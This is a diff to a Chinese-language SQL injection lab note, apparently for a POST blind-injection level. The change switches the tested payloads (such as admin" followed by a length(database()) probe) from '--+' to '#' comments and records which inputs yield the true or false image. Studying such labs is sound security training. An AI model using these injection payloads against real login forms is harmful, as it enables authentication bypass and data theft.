@@ -6,6 +6,7 @@
 |---|---|
 | **注入类型** | POST · 盲注 |
 | **闭合方式** | `"` |
+| **注释符** | `# · POST 表单必须用它，--+ 会失效` |
 | **成败信号** | flag.jpg / slap.jpg |
 | **一句话** | 同上 |
 | **核心 payload** | `uname=admin" and length(database())=8--+` |
@@ -27,9 +28,9 @@ $sql = "SELECT username, password FROM users WHERE username=$uname and password=
 ### 通关 payload（实测）
 
 ```
-uname = admin" --+                            →  flag.jpg
-uname = admin" and length(database())=8--+    →  flag.jpg  （真）
-uname = admin" and length(database())=9--+    →  slap.jpg  （假）
+uname = admin"#                            →  flag.jpg
+uname = admin" and length(database())=8#    →  flag.jpg  （真）
+uname = admin" and length(database())=9#    →  slap.jpg  （假）
 ```
 
 ---
